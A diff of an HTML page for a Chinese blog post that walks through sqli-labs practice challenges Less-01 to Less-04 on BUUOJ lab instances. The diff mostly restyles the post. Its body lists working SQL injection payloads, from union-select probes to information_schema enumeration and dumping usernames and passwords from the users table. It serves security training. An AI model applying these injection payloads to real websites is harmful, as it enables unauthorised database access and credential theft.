@@ -25,6 +25,10 @@
   
 
   
+    <meta name="description" content="
+用校园网可能不能成功发送payload，切记！！！
+">
+  
 
   <!-- feed -->
   
@@ -407,119 +411,137 @@
 
 
   
-  <a id="more"></a>
-
-<blockquote>
+  <blockquote>
 <p>用校园网可能不能成功发送payload，切记！！！</p>
 </blockquote>
+<a id="more"></a>
+
 <h2 id="Less-01"><a href="#Less-01" class="headerlink" title="Less-01"></a>Less-01</h2><ul>
 <li><p>先判断是字符型注入还是数字型注入</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga9XGq.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9XGq.png" srcset="data:image/png;base64,666" alt="Ga9XGq.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1</a> and 1=2–+</p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=1</a> and 1=2–+</em></strong></p>
+<hr>
 <ul>
 <li><p>再判断注入点</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga9m9b.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9m9b.png" srcset="data:image/png;base64,666" alt="Ga9m9b.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,2,3–+</p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,2,3–+</em></strong></p>
+<hr>
 <ul>
 <li><p>查看数据库名称</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga9sko.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9sko.png" srcset="data:image/png;base64,666" alt="Ga9sko.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,database(),3–+</p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,database(),3–+</em></strong></p>
+<hr>
 <ul>
 <li><p>查看库中的表</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga9q0T.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9q0T.png" srcset="data:image/png;base64,666" alt="Ga9q0T.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+</p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+</em></strong></p>
+<hr>
 <ul>
 <li><p>查看用户表中字段</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga9e4r.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9e4r.png" srcset="data:image/png;base64,666" alt="Ga9e4r.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_name=”users”–+</p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;">http://8ac8c2ec-ac49-4043-98a6-ebb1506ca92f.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(column_name),3 from information_schema.columns where table_name=”users”–+</em></strong></p>
+<hr>
 <ul>
 <li><p>查看用户名和密码</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga9JxK.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9JxK.png" srcset="data:image/png;base64,666" alt="Ga9JxK.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(username,password),3 from security.users–+</p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(username,password),3 from security.users–+</em></strong></p>
+<hr>
 <ul>
 <li><p>换个方式显示</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga9xj1.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9xj1.png" srcset="data:image/png;base64,666" alt="Ga9xj1.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(username),group_concat(password) from security.users–+</p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-1/?id=-1&#39;</a> union select 1,group_concat(username),group_concat(password) from security.users–+</em></strong></p>
+<hr>
 <h2 id="Less-02"><a href="#Less-02" class="headerlink" title="Less-02"></a>Less-02</h2><ul>
 <li><p>判断是数字型注入还是字符型注入</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga9MEE.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9MEE.png" srcset="data:image/png;base64,666"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1</a></p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=3-1</a></em></strong></p>
+<hr>
 <ul>
 <li><p>判断注入点</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga9H0u.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9H0u.png" srcset="data:image/png;base64,666" alt="Ga9H0u.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+</a></p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,2,3--+</a></em></strong></p>
+<hr>
 <ul>
 <li><p>往下操作与第一题类似，payload就差了一个单引号</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga9bjv.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9bjv.png" srcset="data:image/png;base64,666" alt="Ga9bjv.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-2/?id=-1%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p>
+<hr>
 <h2 id="Less-03"><a href="#Less-03" class="headerlink" title="Less-03"></a>Less-03</h2><ul>
 <li><p>判断为字符型注入还是数字型注入</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga9NuR.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9NuR.png" srcset="data:image/png;base64,666" alt="Ga9NuR.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1</a></p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=2-1</a></em></strong></p>
+<hr>
 <ul>
 <li><p>该题为字符型注入，但直接使用联合注入报错</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga90Nn.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga90Nn.png" srcset="data:image/png;base64,666" alt="Ga90Nn.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+</a></p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27%20union%20select%201,2,3--+</a></em></strong></p>
+<hr>
 <ul>
 <li><p>根据题目提示，在id表示的数据及引号后加上括号，再进行联合注入，注入成功</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga9vRP.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9vRP.png" srcset="data:image/png;base64,666" alt="Ga9vRP.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+</a></p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,2,3--+</a></em></strong></p>
+<hr>
 <ul>
 <li><p>往下与第一题相同，union后的payload一致</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga9wA6.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9wA6.png" srcset="data:image/png;base64,666" alt="Ga9wA6.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-3/?id=-2%27)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p>
+<hr>
 <h2 id="Less-04"><a href="#Less-04" class="headerlink" title="Less-04"></a>Less-04</h2><ul>
 <li><p>判断为字符型注入还是数字型注入</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga98Ih.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga98Ih.png" srcset="data:image/png;base64,666" alt="Ga98Ih.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1</a></p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=2-1</a></em></strong></p>
+<hr>
 <ul>
 <li><p>使用单引号进行闭合，报错</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga9I10.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga9I10.png" srcset="data:image/png;base64,666" alt="Ga9I10.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+</a></p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%27%20union%20select%201,2,3--+</a></em></strong></p>
+<hr>
 <ul>
 <li><p>组合单引号、双引号以及括号得到注入点</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga97r5.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga97r5.png" srcset="data:image/png;base64,666" alt="Ga97r5.png"></p>
 </li>
 </ul>
-<p>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;</a>) union select 1,2,3–+</p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1&quot;</a>) union select 1,2,3–+</em></strong></p>
+<hr>
 <ul>
 <li><p>往下步骤与上述题目相同</p>
 <p><img src="https://www.helloimg.com/images/2021/11/30/Ga96lm.png" class="lazyload" data-srcset="https://www.helloimg.com/images/2021/11/30/Ga96lm.png" srcset="data:image/png;base64,666" alt="Ga96lm.png"></p>
 </li>
 </ul>
-<p><a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></p>
+<p><strong><em>payload：<a target="_blank" rel="noopener" href="http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+">http://4f1d0aae-57f1-4a98-b3ef-e509432f5d43.node4.buuoj.cn/Less-4/?id=-1%22)%20union%20select%201,group_concat(username),group_concat(password)%20from%20security.users--+</a></em></strong></p>
+<hr>
 
   
   
@@ -554,7 +576,7 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-11-30T22:53:52+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-11-30T23:06:13+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
     <p>更新于：2021年11月30日</p>
@@ -579,7 +601,9 @@
       
         <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://uniqueland.top/2021/11/30/sqli-labs/&title=sqli-labs - Uniqueland&summary="
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://uniqueland.top/2021/11/30/sqli-labs/&title=sqli-labs - Uniqueland&summary=
+用校园网可能不能成功发送payload，切记！！！
+"
           
           >
           
@@ -591,7 +615,9 @@
       
         <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://uniqueland.top/2021/11/30/sqli-labs/&title=sqli-labs - Uniqueland&summary="
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://uniqueland.top/2021/11/30/sqli-labs/&title=sqli-labs - Uniqueland&summary=
+用校园网可能不能成功发送payload，切记！！！
+"
           
           >
           
@@ -603,7 +629,9 @@
       
         <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
           
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://uniqueland.top/2021/11/30/sqli-labs/&title=sqli-labs - Uniqueland&summary="
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://uniqueland.top/2021/11/30/sqli-labs/&title=sqli-labs - Uniqueland&summary=
+用校园网可能不能成功发送payload，切记！！！
+"
           
           >
           
@@ -636,12 +664,13 @@
       
         <a class='next' href='/2021/11/29/deep_learning_from_scratch_2/'>
           <p class='title'>Deep Learning from Scratch 2<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>
-在”手写数字识别”中
+          <p class='content'>在”手写数字识别”中
+
+
 了解到了mnist数据集
 
 对运算过程中运算的具体对象有点问题
-1234567891011import sys, ossys.path.append(os.pardir)...</p>
+1234567891011import sys, ossys.path.append(os.pardir...</p>
         </a>
       
     </div>
